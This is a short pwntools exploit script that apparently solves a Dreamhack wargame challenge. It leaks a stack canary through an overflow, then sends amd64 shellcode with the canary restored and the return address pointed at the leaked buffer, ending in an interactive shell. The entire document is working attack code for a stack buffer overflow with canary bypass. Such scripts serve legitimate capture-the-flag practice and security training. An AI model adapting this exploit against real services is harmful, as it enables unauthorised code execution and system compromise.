from pwn import *

r = remote('host3.dreamhack.games', 14412)

context.arch = "amd64"

r.recvuntil("buf: ")
buf = int(r.recvline()[:-1], 16)

r.recvuntil("$rbp: ")
buf2sfp = int(r.recvline().split()[0])
buf2cnry = buf2sfp - 8

payload = b"A"*(buf2cnry + 1)

r.sendafter("Input:", payload)
r.recvuntil(payload)
cnry = u64(b"\x00" + r.recvn(7))

sh = asm(shellcraft.sh())
payload = sh.ljust(buf2cnry, b"A") + p64(cnry) + b"B"*0x8 + p64(buf)

r.sendline(payload)
r.interactive()
